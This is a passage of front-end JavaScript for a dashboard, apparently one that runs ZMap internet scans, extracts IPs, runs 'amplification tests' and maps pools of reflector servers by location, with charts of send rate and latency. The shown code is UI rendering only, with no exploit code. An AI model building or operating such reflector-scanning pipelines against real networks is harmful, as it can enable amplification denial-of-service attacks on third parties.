    if (!container) return;
    if (!files.length) {
        container.innerHTML = `<div class="info-text">暂无输出文件。</div>`;
        return;
    }
    container.innerHTML = files.map((file) => `
        <button type="button" class="tcp-artifact-item tcp-file-button" data-file-name="${escapeHtml(file.name)}">
            <span>${escapeHtml(file.name)}</span>
            <strong>${formatBytes(file.bytes || 0)}</strong>
        </button>
    `).join("");
    container.querySelectorAll("[data-file-name]").forEach((item) => {
        item.addEventListener("click", () => openTcpFileModal(item.getAttribute("data-file-name")));
    });
}

function renderTcpStages(stages, currentStage) {
    const container = document.getElementById("tcpStages");
    if (!container) return;
    const order = ["prepare_zmap", "run_zmap_scan", "process_scan_csv", "extract_ips", "run_amplification_test", "analyze_amplification_log"];
    container.innerHTML = order.map((stage) => {
        const state = stages[stage]?.status || (stage === currentStage ? "running" : "pending");
        return `<div class="tcp-stage-item"><span>${getTcpStageText(stage)}</span><strong>${escapeHtml(getTcpStatusText(state))}</strong></div>`;
    }).join("");
}

function renderTcpRuntimeError(summary) {
    const errorBox = document.getElementById("tcpRuntimeError");
    if (!errorBox) return;
    const error = summary.error || summary.runtime_error || "";
    errorBox.textContent = error ? `失败原因：${error}` : "";
}

function renderTcpEmptyState() {
    currentTcpRunId = null;
    currentTcpSummary = null;
    setText("tcpStatus", "空闲");
    setText("tcpRunId", "-");
    setText("tcpRunMethod", "-");
    setText("tcpRunHost", "-");
    setText("tcpPreflightStatus", "真实扫描前会自动执行环境预检。");
    const runList = document.getElementById("tcpRunList");
    if (runList) runList.innerHTML = `<div class="info-text">暂无 TCP 扫描任务。</div>`;
    const stages = document.getElementById("tcpStages");
    if (stages) stages.innerHTML = "";
    const artifacts = document.getElementById("tcpArtifacts");
    if (artifacts) artifacts.innerHTML = `<div class="info-text">暂无 TCP 扫描记录。</div>`;
    const log = document.getElementById("tcpPipelineLog");
    if (log) log.textContent = "尚未选择 TCP 扫描。";
    const meta = document.getElementById("tcpRunMeta");
    if (meta) meta.innerHTML = "";
    const errorBox = document.getElementById("tcpRuntimeError");
    if (errorBox) errorBox.textContent = "";
    setTcpControls(false, false);
    updateWorkflowIndicators();
}

function setTcpControls(hasRunningTask, canStopCurrent) {
    const stop = document.getElementById("tcpStopBtn");
    const stopCleanup = document.getElementById("tcpStopCleanupBtn");
    if (stop) stop.disabled = !canStopCurrent;
    if (stopCleanup) stopCleanup.disabled = !canStopCurrent;
}

async function openTcpFileModal(filename) {
    if (!currentTcpRunId || !filename) return;
    try {
        const response = await fetch(`/api/tcp-scan/runs/${currentTcpRunId}/files/${encodeURIComponent(filename)}`);
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "文件加载失败");
        currentTcpFile = data.file;
        renderTcpFileModal(data.file);
        const modal = document.getElementById("tcpFileModal");
        if (modal) modal.hidden = false;
    } catch (error) {
        showNotification(`文件加载失败：${error.message}`, "error");
    }
}

async function openDnsFileModal(filename) {
    if (!currentDnsRunId || !filename) return;
    try {
        const response = await fetch(`/api/dns-scan/runs/${currentDnsRunId}/files/${encodeURIComponent(filename)}`);
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "文件加载失败");
        currentDnsFile = {
            name: data.filename || filename,
            content: data.content || "",
            editable: false
        };
        renderTcpFileModal(currentDnsFile);
        const modal = document.getElementById("tcpFileModal");
        if (modal) modal.hidden = false;
    } catch (error) {
        showNotification(`文件加载失败：${error.message}`, "error");
    }
}

function renderTcpFileModal(file) {
    const title = document.getElementById("tcpFileModalTitle");
    const body = document.getElementById("tcpFileModalBody");
    const saveBtn = document.getElementById("tcpFileSaveBtn");
    const reloadBtn = document.getElementById("tcpFileReloadBtn");
    if (title) title.textContent = file.name || "文件内容";
    if (reloadBtn) reloadBtn.disabled = false;
    if (file.type === "db") {
        if (saveBtn) saveBtn.disabled = true;
        if (body) body.innerHTML = renderTcpDbPreview(file.preview);
        return;
    }
    if (saveBtn) saveBtn.disabled = !file.editable;
    if (body) {
        body.innerHTML = file.editable
            ? `<textarea id="tcpFileEditor">${escapeHtml(file.content || "")}</textarea>`
            : `<pre>${escapeHtml(file.content || "")}</pre>`;
        if (file.editable) {
            const textarea = document.getElementById("tcpFileEditor");
            if (textarea) textarea.value = file.content || "";
        }
    }
}

function renderTcpDbPreview(preview) {
    const tables = preview?.preview_tables || [];
    if (!tables.length) {
        return `<div class="tcp-db-preview">该数据库暂无可预览数据。</div>`;
    }
    return `
        <div class="tcp-db-preview">
            <div>共 ${preview.tables?.length || 0} 张表：${escapeHtml((preview.tables || []).join(", "))}</div>
            ${tables.map((table) => `
                <div class="tcp-db-table">
                    <table>
                        <thead>
                            <tr>${table.columns.map((column) => `<th>${escapeHtml(column)}</th>`).join("")}</tr>
                        </thead>
                        <tbody>
                            ${table.rows.map((row) => `<tr>${row.map((value) => `<td>${escapeHtml(String(value ?? ""))}</td>`).join("")}</tr>`).join("")}
                        </tbody>
                    </table>
                </div>
            `).join("")}
        </div>
    `;
}

function closeTcpFileModal() {
    const modal = document.getElementById("tcpFileModal");
    if (modal) modal.hidden = true;
    currentTcpFile = null;
    currentDnsFile = null;
}

async function saveTcpFileContent() {
    if (!currentTcpRunId || !currentTcpFile?.editable) return;
    const textarea = document.getElementById("tcpFileEditor");
    const content = textarea?.value ?? "";
    try {
        const result = await fetch(`/api/tcp-scan/runs/${currentTcpRunId}/files/${encodeURIComponent(currentTcpFile.name)}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content })
        });
        const data = await result.json();
        if (!data.success) throw new Error(data.message || "文件保存失败");
        showNotification(data.message || "文件已保存", "success");
        await refreshTcpScan();
        await reloadTcpFileContent();
    } catch (error) {
        showNotification(`文件保存失败：${error.message}`, "error");
    }
}

async function reloadTcpFileContent() {
    if (currentDnsFile?.name) {
        await openDnsFileModal(currentDnsFile.name);
        return;
    }
    if (!currentTcpFile?.name) return;
    await openTcpFileModal(currentTcpFile.name);
}

function readNumberAllowZero(id, fallback) {
    const value = Number(document.getElementById(id)?.value);
    return Number.isFinite(value) && value >= 0 ? value : fallback;
}

function getTcpStageText(stage) {
    return {
        prepare_zmap: "准备 ZMap",
        run_zmap_scan: "执行 ZMap 扫描",
        process_scan_csv: "处理扫描 CSV",
        extract_ips: "提取 IP",
        run_amplification_test: "执行放大测试",
        analyze_amplification_log: "分析放大日志",
        "-": "-"
    }[stage] || stage || "-";
}

function getTcpStatusText(status) {
    return {
        idle: "空闲",
        running: "运行中",
        stopping: "停止中",
        stopped: "已停止",
        completed: "已完成",
        failed: "失败",
        skipped: "已跳过",
        pending: "等待中",
        unknown: "未知"
    }[status] || status || "未知";
}

function getTcpApiMessage(message, fallback) {
    if (!message) return fallback;
    return {
        "TCP scan started": "TCP 扫描已启动",
        "TCP scan is already running": "TCP 扫描正在运行",
        "Stopping TCP scan": "正在停止 TCP 扫描",
        "No running process found": "未找到正在运行的扫描进程",
        "Run not found": "未找到扫描记录"
    }[message] || message;
}

function formatBytes(bytes) {
    const units = ["B", "KB", "MB", "GB"];
    let value = Number(bytes) || 0;
    let index = 0;
    while (value >= 1024 && index < units.length - 1) {
        value /= 1024;
        index += 1;
    }
    return `${value.toFixed(index === 0 ? 0 : 1)} ${units[index]}`;
}

function initChart() {
    const ctx = document.getElementById("ppsChart")?.getContext("2d");
    if (!ctx || !window.Chart) return;
    ppsChart = new Chart(ctx, {
        type: "line",
        data: {
            labels: [],
            datasets: [{
                label: "发送速率 (pps)",
                data: [],
                borderColor: "#40e7ff",
                backgroundColor: "rgba(64, 231, 255, 0.12)",
                borderWidth: 2,
                tension: 0.28,
                pointRadius: 2,
                pointBackgroundColor: "#ff4f6d",
                fill: true
            }]
        },
        options: baseChartOptions("PPS")
    });
}

function initLatencyChart() {
    const ctx = document.getElementById("latencyChart")?.getContext("2d");
    if (!ctx || !window.Chart) return;
    latencyChart = new Chart(ctx, {
        type: "line",
        data: {
            labels: [],
            datasets: [{
                label: "TCP 延迟 (ms)",
                data: [],
                borderColor: "#ffbd5c",
                backgroundColor: "rgba(255, 189, 92, 0.12)",
                borderWidth: 2,
                tension: 0.25,
                pointRadius: 2,
                fill: true,
                spanGaps: false
            }]
        },
        plugins: [latencyTimeoutBandPlugin],
        options: {
            ...baseChartOptions("延迟 (ms)"),
            scales: {
                y: {
                    beginAtZero: true,
                    grid: { color: "rgba(143, 168, 199, 0.13)" },
                    ticks: { color: "#8fa8c7" },
                    title: { display: true, text: "延迟 (ms)", color: "#8fa8c7" }
                },
                x: {
                    grid: { color: "rgba(143, 168, 199, 0.09)" },
                    ticks: { color: "#8fa8c7" },
                    title: { display: true, text: "时间 (秒)", color: "#8fa8c7" }
                }
            },
            plugins: {
                legend: { labels: { color: "#c7d8ef" } },
                tooltip: {
                    callbacks: {
                        label: (ctx) => ctx.raw === null ? "超时" : `${ctx.raw} ms`
                    }
                }
            }
        }
    });
}

function baseChartOptions(yTitle) {
    return {
        responsive: true,
        maintainAspectRatio: false,
        animation: false,
        plugins: {
            legend: { labels: { color: "#c7d8ef" } }
        },
        scales: {
            y: {
                beginAtZero: true,
                grid: { color: "rgba(143, 168, 199, 0.13)" },
                ticks: { color: "#8fa8c7" },
                title: { display: true, text: yTitle, color: "#8fa8c7" }
            },
            x: {
                grid: { color: "rgba(143, 168, 199, 0.09)" },
                ticks: { color: "#8fa8c7" }
            }
        }
    };
}

function resizeCharts() {
    setTimeout(() => {
        ppsChart?.resize();
        latencyChart?.resize();
        resizeServerGlobe();
    }, 60);
}

function normalizeGeoPoints(points) {
    return points
        .filter((point) => Number.isFinite(Number(point.lat)) && Number.isFinite(Number(point.lon)))
        .map((point) => ({
            ...point,
            protocol: currentProto,
            lat: Number(point.lat),
            lon: Number(point.lon),
            entryCount: Array.isArray(point.entries) ? point.entries.length : 1
        }));
}

function renderGeoUnresolved(items) {
    const container = document.getElementById("geoUnresolvedList");
    if (!container) return;
    if (!items.length) {
        container.classList.remove("active");
        container.innerHTML = "";
        return;
    }
    const preview = items.slice(0, 5)
        .map((item) => `${escapeHtml(item.entry || item.ip || "-")} (${escapeHtml(formatGeoReason(item.reason))})`)
        .join(" · ");
    const suffix = items.length > 5 ? ` · 另有 ${items.length - 5} 个未显示` : "";
    container.classList.add("active");
    container.innerHTML = `<strong>未定位：</strong>${preview}${suffix}`;
}

function resetServerSelectionState() {
    selectedAreaCode = "";
    selectedIp = "";
    serverListFilterMode = "all";
}

function buildServerResourceItems(points) {
    return points.map((point) => {
        const entries = Array.isArray(point.entries) && point.entries.length ? point.entries : [point.ip];
        return {
            id: `${point.ip || "unknown"}:${entries[0] || point.ip || "entry"}`,
            entry: entries[0] || point.ip || "-",
            entries,
            entryCount: entries.length,
            ip: point.ip || entries[0] || "-",
            country: point.country || "",
            country_code: point.country_code || "",
            region: point.region || "",
            region_code: point.region_code || "",
            city: point.city || "",
            isp: point.isp || "",
            lat: Number(point.lat),
            lon: Number(point.lon),
            stale: Boolean(point.stale)
        };
    });
}

function buildServerUnresolvedItems(items) {
    return items.map((item, index) => ({
        id: `unresolved:${index}:${item.entry || item.ip || ""}`,
        entry: item.entry || item.ip || "-",
        ip: item.ip || "",
        reason: item.reason || "unknown"
    }));
}

function getAreaDisplayName(area) {
    if (!area) return "未知区域";
    return area.level === "region"
        ? `${area.country || "-"} / ${area.region || area.name || "-"}`
        : `${area.country || area.name || "-"}`;
}

function getSelectedArea() {
    return lastGeoAreas.find((area) => String(area.area_code || "") === selectedAreaCode) || null;
}

function getAreaForItem(item) {
    if (!item) return null;
    return lastGeoAreas.find((area) => Array.isArray(area.ips) && area.ips.includes(item.ip)) || null;
}

function getVisibleServerResourceItems() {
    if (serverListFilterMode === "area" && selectedAreaCode) {
        const area = getSelectedArea();
        if (!area) return [];
        return serverResourceItems.filter((item) => area.ips.includes(item.ip));
    }
    if (serverListFilterMode === "ip" && selectedIp) {
        return serverResourceItems.filter((item) => item.ip === selectedIp);
    }
    return serverResourceItems;
}

function clearServerSelection() {
    resetServerSelectionState();
    renderServerWorkspace();
    updateWorkflowIndicators();
}

function selectServerArea(areaCode) {
    const area = lastGeoAreas.find((item) => String(item.area_code || "") === String(areaCode || ""));
    if (!area) return;
    selectedAreaCode = String(area.area_code || "");
    selectedIp = "";
    serverListFilterMode = "area";
    focusServerArea(area);
    renderServerWorkspace();
    updateWorkflowIndicators();
}

function selectServerIp(ip) {
    const item = serverResourceItems.find((resource) => resource.ip === ip);
    if (!item) return;
    selectedIp = ip;
    const area = getAreaForItem(item);
    selectedAreaCode = area?.area_code || "";
    serverListFilterMode = "ip";
    if (area) focusServerArea(area, item);
    renderServerWorkspace();
    updateWorkflowIndicators();
}

function focusServerArea(area, item = null) {
    const targetLat = item && Number.isFinite(item.lat) ? item.lat : null;
    const targetLon = item && Number.isFinite(item.lon) ? item.lon : null;
    if (serverGlobe) {
        if (targetLat !== null && targetLon !== null) {
            serverGlobe.pointOfView({ lat: targetLat, lng: targetLon, altitude: 1.3 }, 900);
        } else {
            const firstAreaPoint = lastGeoPoints.find((point) => area.ips.includes(point.ip));
            if (firstAreaPoint) {
                serverGlobe.pointOfView({ lat: firstAreaPoint.lat, lng: firstAreaPoint.lon, altitude: 1.7 }, 900);
            }
        }
    }
}

function renderServerWorkspace() {
    renderServerFilterSummary();
    renderServerSelectionDetail();
    renderServerResourceList();
    renderServerUnresolvedItems();
    renderServerMap();
    updateWorkflowIndicators();
}

function renderServerFilterSummary() {
    const title = document.getElementById("serverFilterTitle");
    const count = document.getElementById("serverVisibleCount");
    const clearBtn = document.getElementById("clearServerSelectionBtn");
    const visibleItems = getVisibleServerResourceItems();
    const area = getSelectedArea();
    let filterTitle = "全部资源";
    if (serverListFilterMode === "area" && area) {
        filterTitle = `区域筛选 · ${getAreaDisplayName(area)}`;
    } else if (serverListFilterMode === "ip" && selectedIp) {
        filterTitle = `IP 定位 · ${selectedIp}`;
    }
    if (title) title.textContent = filterTitle;
    if (count) count.textContent = String(visibleItems.length);
    if (clearBtn) clearBtn.disabled = serverListFilterMode === "all";
}

function renderServerSelectionDetail() {
    const container = document.getElementById("serverSelectionDetail");
    if (!container) return;
    if (serverListFilterMode === "all") {
        container.innerHTML = `
            <div class="server-detail-grid">
                <div><span>当前协议</span><strong>${escapeHtml(getMethodText(currentProto))}</strong></div>
                <div><span>已选源文件</span><strong>${escapeHtml(getSelectedServerSourceSummary())}</strong></div>
                <div><span>已选数量</span><strong>${escapeHtml(String(getSelectedServerSources().length))}</strong></div>
                <div><span>交互提示</span><strong>点击地图区域或 IP 反向定位</strong></div>
            </div>
        `;
        return;
    }
    if (serverListFilterMode === "all") {
        container.innerHTML = `<div class="info-text">点击地图区域可筛选资源，点击 IP 列表可反向定位所在区域。</div>`;
        return;
    }
    if (serverListFilterMode === "area") {
        const area = getSelectedArea();
        if (!area) {
            container.innerHTML = `<div class="info-text">当前区域已不可用，请重新选择。</div>`;
            return;
        }
        container.innerHTML = `
            <div class="server-detail-grid">
                <div><span>当前区域</span><strong>${escapeHtml(getAreaDisplayName(area))}</strong></div>
                <div><span>资源条目</span><strong>${escapeHtml(String(area.resource_count || 0))}</strong></div>
                <div><span>IP 数量</span><strong>${escapeHtml(String((area.ips || []).length))}</strong></div>
                <div><span>协议</span><strong>${escapeHtml(getMethodText(area.protocol))}</strong></div>
            </div>
        `;
        return;
    }
    const selectedItem = serverResourceItems.find((item) => item.ip === selectedIp);
    const area = selectedItem ? getAreaForItem(selectedItem) : null;
    if (!selectedItem) {
        container.innerHTML = `<div class="info-text">当前 IP 已不可用，请重新选择。</div>`;
        return;
    }
    container.innerHTML = `
        <div class="server-detail-grid">
            <div><span>资源条目</span><strong>${escapeHtml(selectedItem.entry)}</strong></div>
            <div><span>IP</span><strong>${escapeHtml(selectedItem.ip)}</strong></div>
            <div><span>地区</span><strong>${escapeHtml(area ? getAreaDisplayName(area) : "未定位")}</strong></div>
            <div><span>城市</span><strong>${escapeHtml(selectedItem.city || "-")}</strong></div>
        </div>
    `;
}

function renderServerResourceList() {
    const container = document.getElementById("serverResourceList");
    if (!container) return;
    const visibleItems = getVisibleServerResourceItems();
    if (!visibleItems.length) {
        container.innerHTML = `<div class="info-text">当前筛选条件下没有可展示的资源。</div>`;
        return;
    }
    container.innerHTML = visibleItems.map((item) => {
        const area = getAreaForItem(item);
        const isActive = selectedIp === item.ip && serverListFilterMode === "ip";
        const inSelectedArea = selectedAreaCode && area?.area_code === selectedAreaCode;
        return `
            <button type="button" class="server-resource-item ${isActive ? "active" : ""}" data-server-ip="${escapeHtml(item.ip)}">
                <span class="server-resource-main">
                    <strong>${escapeHtml(item.entry)}</strong>
                    <span>${escapeHtml(item.ip)}</span>
                    ${item.entryCount > 1 ? `<span>并集来源 ${escapeHtml(String(item.entryCount))} 条</span>` : ""}
                </span>
                <span class="server-resource-meta">
                    <span>${escapeHtml(area ? getAreaDisplayName(area) : "未定位")}</span>
                    <span>${escapeHtml(item.city || item.country || "-")}</span>
                    ${inSelectedArea ? `<em>当前区域</em>` : ""}
                </span>
            </button>
        `;
    }).join("");
    container.querySelectorAll("[data-server-ip]").forEach((item) => {
        item.addEventListener("click", () => selectServerIp(item.getAttribute("data-server-ip") || ""));
    });
}

function renderServerUnresolvedItems() {
    const container = document.getElementById("serverUnresolvedList");
    if (!container) return;
    if (!serverUnresolvedItems.length) {
        container.innerHTML = `<div class="info-text">当前没有未定位条目。</div>`;
        return;
    }
    container.innerHTML = serverUnresolvedItems.map((item) => `
        <div class="server-unresolved-item">
            <strong>${escapeHtml(item.entry)}</strong>
            <span>${escapeHtml(formatGeoReason(item.reason))}</span>
        </div>
    `).join("");
}

function renderServerFileModal(file) {
    const title = document.getElementById("serverFileModalTitle");
    const body = document.getElementById("serverFileModalBody");
    const saveBtn = document.getElementById("serverFileSaveBtn");
    const reloadBtn = document.getElementById("serverFileReloadBtn");
    if (title) title.textContent = file.name || "资源文件";
    if (saveBtn) saveBtn.disabled = !file.editable;
    if (reloadBtn) reloadBtn.disabled = false;
    if (body) {
        body.innerHTML = file.editable
            ? `<textarea id="serverFileEditor">${escapeHtml(file.content || "")}</textarea>`
            : `<pre>${escapeHtml(file.content || "")}</pre>`;
        if (file.editable) {
            const textarea = document.getElementById("serverFileEditor");
            if (textarea) textarea.value = file.content || "";
        }
    }
}

async function openServerFileModal() {
    try {
        const response = await fetch(`/api/servers/${currentProto}/file`);
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "资源文件加载失败");
        currentServerFile = data.file;
        renderServerFileModal(data.file);
        const modal = document.getElementById("serverFileModal");
        if (modal) modal.hidden = false;
    } catch (error) {
        showNotification(`资源文件加载失败：${error.message}`, "error");
    }
}

function closeServerFileModal() {
    const modal = document.getElementById("serverFileModal");
    if (modal) modal.hidden = true;
    currentServerFile = null;
}

async function saveServerFileContent() {
    if (!currentServerFile?.editable) return;
    const textarea = document.getElementById("serverFileEditor");
    const content = textarea?.value ?? "";
    try {
        const response = await fetch(`/api/servers/${currentProto}/file`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content })
        });
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "资源文件保存失败");
        showNotification(data.message || "资源文件已保存", "success");
        await loadServerGeoMap();
        await reloadServerFileContent();
        loadAllServerCounts();
    } catch (error) {
        showNotification(`资源文件保存失败：${error.message}`, "error");
    }
}

async function reloadServerFileContent() {
    if (!currentServerFile?.name) return;
    await openServerFileModal();
}

function renderServerSourceModal() {
    const title = document.getElementById("serverSourceModalTitle");
    const body = document.getElementById("serverSourceModalBody");
    const sources = getAvailableServerSources();
    const selected = new Set(getSelectedServerSources());
    if (title) title.textContent = `${getMethodText(currentProto)} 源文件选择`;
    if (!body) return;
    if (!sources.length) {
        body.innerHTML = `<div class="server-source-summary">当前协议没有可用源文件。</div>`;
        return;
    }
    body.innerHTML = `
        <div class="server-source-summary">
            当前协议：${escapeHtml(getMethodText(currentProto))}。选中的文件会按并集合并展示到地图、统计和 IP 列表中。
        </div>
        <div class="server-source-list">
            ${sources.map((file) => `
                <label class="server-source-item">
                    <input type="checkbox" value="${escapeHtml(file.name)}" ${selected.has(file.name) ? "checked" : ""}>
                    <span>
                        <strong>${escapeHtml(file.name)}</strong>
                        <span>${escapeHtml(file.path || "")}</span>
                    </span>
                    <em>${escapeHtml(String(file.entry_count || 0))} 条</em>
                </label>
            `).join("")}
        </div>
    `;
}

async function openServerFileModal() {
    try {
        await ensureServerSourceSelection(currentProto, true);
        renderServerSourceModal();
        const modal = document.getElementById("serverSourceModal");
        if (modal) modal.hidden = false;
    } catch (error) {
        showNotification(`资源源文件加载失败：${error.message}`, "error");
    }
}

function closeServerSourceModal() {
    const modal = document.getElementById("serverSourceModal");
    if (modal) modal.hidden = true;
}

async function applyServerSourceSelection() {
    const body = document.getElementById("serverSourceModalBody");
    const selected = Array.from(body?.querySelectorAll("input[type='checkbox']:checked") || [])
        .map((input) => input.value)
        .filter(Boolean);
    if (!selected.length) {
        showNotification("请至少选择一个源文件", "error");
        return;
    }
    selectedServerSourcesByProto[currentProto] = selected;
    closeServerSourceModal();
    resetServerSelectionState();
    await loadServerGeoMap();
    await openServerEditorModal(selected[0]);
}

function renderServerFileModal(file) {
    const title = document.getElementById("serverFileModalTitle");
    const body = document.getElementById("serverFileModalBody");
    const saveBtn = document.getElementById("serverFileSaveBtn");
    const reloadBtn = document.getElementById("serverFileReloadBtn");
    const selected = getSelectedServerSources();
    if (title) title.textContent = file.name || "编辑源文件";
    if (saveBtn) saveBtn.disabled = !file.editable;
    if (reloadBtn) reloadBtn.disabled = false;
    if (!body) return;

    const switcher = selected.length > 1 ? `
        <div class="server-file-switcher">
            <label for="serverFileSourceSelect">当前编辑文件</label>
            <select id="serverFileSourceSelect">
                ${selected.map((source) => `<option value="${escapeHtml(source)}" ${source === currentServerSource ? "selected" : ""}>${escapeHtml(source)}</option>`).join("")}
            </select>
            <small>地图和资源列表展示的是当前已选文件的并集，编辑一次只作用于一个文件。</small>
        </div>
    ` : "";

    body.innerHTML = `${switcher}${file.editable
        ? `<textarea id="serverFileEditor">${escapeHtml(file.content || "")}</textarea>`
        : `<pre>${escapeHtml(file.content || "")}</pre>`}`;
    if (file.editable) {
        const textarea = document.getElementById("serverFileEditor");
        if (textarea) textarea.value = file.content || "";
    }
    document.getElementById("serverFileSourceSelect")?.addEventListener("change", async (event) => {
        await openServerEditorModal(event.target.value);
    });
}

async function openServerEditorModal(sourceName = "") {
    try {
        const selected = getSelectedServerSources();
        const nextSource = sourceName || currentServerSource || selected[0] || "";
        if (!nextSource) throw new Error("未找到可编辑的源文件");
        const response = await fetch(`/api/servers/${currentProto}/file?source=${encodeURIComponent(nextSource)}`);
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "资源文件加载失败");
        currentServerSource = nextSource;
        currentServerFile = data.file;
        renderServerFileModal(data.file);
        const modal = document.getElementById("serverFileModal");
        if (modal) modal.hidden = false;
    } catch (error) {
        showNotification(`资源文件加载失败：${error.message}`, "error");
    }
}

function closeServerFileModal() {
    const modal = document.getElementById("serverFileModal");
    if (modal) modal.hidden = true;
    currentServerFile = null;
    currentServerSource = "";
}

async function saveServerFileContent() {
    if (!currentServerFile?.editable || !currentServerSource) return;
    const textarea = document.getElementById("serverFileEditor");
    const content = textarea?.value ?? "";
    try {
        const response = await fetch(`/api/servers/${currentProto}/file?source=${encodeURIComponent(currentServerSource)}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content })
        });
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "资源文件保存失败");
        showNotification(data.message || "资源文件已保存", "success");
        await ensureServerSourceSelection(currentProto, true);
        await loadServerGeoMap();
        await reloadServerFileContent();
        loadAllServerCounts();
    } catch (error) {
        showNotification(`资源文件保存失败：${error.message}`, "error");
    }
}

async function reloadServerFileContent() {
    if (!currentServerSource) return;
    await openServerEditorModal(currentServerSource);
}

function setMapStatus(message, loading = false, hide = false) {
    const status = document.getElementById("serverGlobeStatus");
    if (!status) return;
    status.classList.toggle("hidden", hide);
    status.innerText = message;
    status.style.borderLeft = loading ? "4px solid var(--cyan)" : "1px solid rgba(143, 168, 199, 0.2)";
}

function initServerGlobe() {
    const container = document.getElementById("serverGlobe");
    if (!container) return;
    if (!window.Globe) {
        setMapStatus("3D 地图库加载失败，仍可切换 2D 查看资源区域。", false);
        return;
    }
    serverGlobe = window.Globe()(container)
        .backgroundColor("rgba(0,0,0,0)")
        .globeImageUrl("//unpkg.com/three-globe/example/img/earth-blue-marble.jpg")
        .bumpImageUrl("//unpkg.com/three-globe/example/img/earth-topology.png")
        .polygonsData([])
        .polygonAltitude(() => 0.004)
        .polygonCapColor((feature) => getAreaFillColor(feature.properties?._resourceArea))
        .polygonSideColor(() => "rgba(64, 231, 255, 0.08)")
        .polygonStrokeColor(() => "rgba(223, 245, 255, 0.78)")
        .polygonLabel((feature) => renderAreaTooltip(feature.properties?._resourceArea));
    const controls = serverGlobe.controls();
    if (controls) {
        controls.autoRotate = true;
        controls.autoRotateSpeed = 0.35;
        controls.enableDamping = true;
    }
    resizeServerGlobe();
}

function resizeServerGlobe() {
    renderServerMap();
}

function resizeServerMapSurface() {
    const container = document.getElementById("serverGlobe");
    if (!container || !serverGlobe) return;
    const width = Math.max(280, container.clientWidth);
    const height = Math.max(300, container.clientHeight);
    serverGlobe.width(width).height(height);
}

async function loadServerGeoMap() {
    if (isGeoMapLoading) return;
    isGeoMapLoading = true;
    setMapStatus("正在定位资源池 IP...", true);
    try {
        await ensureServerSourceSelection(currentProto);
        const response = await fetch(`/api/servers/${currentProto}/geo${buildServerGeoQuery(currentProto)}`);
        const data = await response.json();
        if (!data.success) throw new Error(data.message || "定位失败");
        updateGeoStats(data);
        renderGeoUnresolved(data.unresolved || []);
        lastGeoPoints = normalizeGeoPoints(data.points || []);
        lastGeoAreas = normalizeGeoAreas(data.areas || []);
        serverResourceItems = buildServerResourceItems(lastGeoPoints);
        serverUnresolvedItems = buildServerUnresolvedItems(data.unresolved || []);
        if (serverListFilterMode === "area" && !getSelectedArea()) {
            resetServerSelectionState();
        }
        if (serverListFilterMode === "ip" && selectedIp && !serverResourceItems.some((item) => item.ip === selectedIp)) {
            resetServerSelectionState();
        }
        await ensureServerMapShapes();
        renderServerWorkspace();
        if (!window.Globe) {
            setMapStatus("3D 地图库加载失败，已保留资源区域统计。", false);
        } else if (data.geo_api_degraded) {
            setMapStatus("GeoIP 服务暂不可用，地图已使用可用缓存和已解析数据。", false);
        } else if (!lastGeoAreas.length) {
            setMapStatus("当前资源池没有可显示的国家或省份区域。", false);
        } else {
            setMapStatus(`已显示 ${lastGeoAreas.length} 个资源归属区域。`, false, true);
        }
    } catch (error) {
        updateGeoStats({ total: 0, located_count: 0, unresolved_count: 0, area_count: 0 });
        renderGeoUnresolved([]);
        serverResourceItems = [];
        serverUnresolvedItems = [];
        resetServerSelectionState();
        renderServerWorkspace();
        setMapStatus(`地图定位失败：${error.message}`, false);
    } finally {
        isGeoMapLoading = false;
        renderServerMap();
        updateWorkflowIndicators();
    }
}

function normalizeGeoAreas(areas) {
    return areas.map((area) => ({
        ...area,
        protocol: currentProto,
        resource_count: Number(area.resource_count || 0),
        entries: Array.isArray(area.entries) ? area.entries : [],
        ips: Array.isArray(area.ips) ? area.ips : []
    }));
}

function updateGeoStats(data) {
    setText("geoTotalCount", String(data.total || 0));
    setText("geoLocatedCount", String(data.located_count || 0));
    setText("geoUnresolvedCount", String(data.unresolved_count || 0));
    setText("geoAreaCount", String(data.area_count || 0));
}

async function ensureServerMapShapes() {
    if (serverMapShapes) return serverMapShapes;
    const [countries, admin1, china] = await Promise.all([
        fetch("/static/maps/countries.geojson").then((response) => response.json()),
        fetch("/static/maps/admin1.geojson").then((response) => response.json()),
        fetch("/static/maps/china-provinces.geojson").then((response) => response.json())
    ]);
    serverMapShapes = { countries, admin1, china };
    return serverMapShapes;
}

function switchServerMapMode(mode) {
    serverMapMode = mode === "2d" ? "2d" : "3d";
    document.querySelectorAll(".map-view-btn").forEach((btn) => {
        btn.classList.toggle("active", btn.dataset.mapView === serverMapMode);
    });
    renderServerMap();
}

function renderServerMap() {
    const globe = document.getElementById("serverGlobe");
    const map2d = document.getElementById("serverMap2d");
    if (globe) globe.hidden = serverMapMode !== "3d";
    if (map2d) map2d.hidden = serverMapMode !== "2d";
    const features = buildAreaFeatures();
    if (serverMapMode === "3d") renderServerMap3d(features);
    if (serverMapMode === "2d") renderServerMap2d(features);
}

function renderServerMap3d(features) {
    resizeServerMapSurface();
    if (!serverGlobe) return;
    serverGlobe
        .polygonsData(features.map(normalizeFeatureForGlobe))
        .polygonCapColor((feature) => getAreaFillColor(feature.properties?._resourceArea))
        .onPolygonClick((feature) => {
            const area = feature?.properties?._resourceArea;
            if (area?.area_code) selectServerArea(area.area_code);
        });
    const activeItem = selectedIp ? serverResourceItems.find((item) => item.ip === selectedIp) : null;
    const activeArea = getSelectedArea();
    if (activeItem && Number.isFinite(activeItem.lat) && Number.isFinite(activeItem.lon)) {
        serverGlobe.pointOfView({ lat: activeItem.lat, lng: activeItem.lon, altitude: 1.3 }, 700);
        return;
    }
    if (activeArea) {
        const areaPoint = lastGeoPoints.find((point) => activeArea.ips.includes(point.ip));
        if (areaPoint) {
            serverGlobe.pointOfView({ lat: areaPoint.lat, lng: areaPoint.lon, altitude: 1.7 }, 700);
            return;
        }
    }
    const first = lastGeoPoints.find((point) => Number.isFinite(point.lat) && Number.isFinite(point.lon));
    if (first) serverGlobe.pointOfView({ lat: first.lat, lng: first.lon, altitude: 2.1 }, 700);
}

function renderServerMap2d(features) {
    const svg = document.getElementById("serverMap2dSvg");
    const container = document.getElementById("serverMap2d");
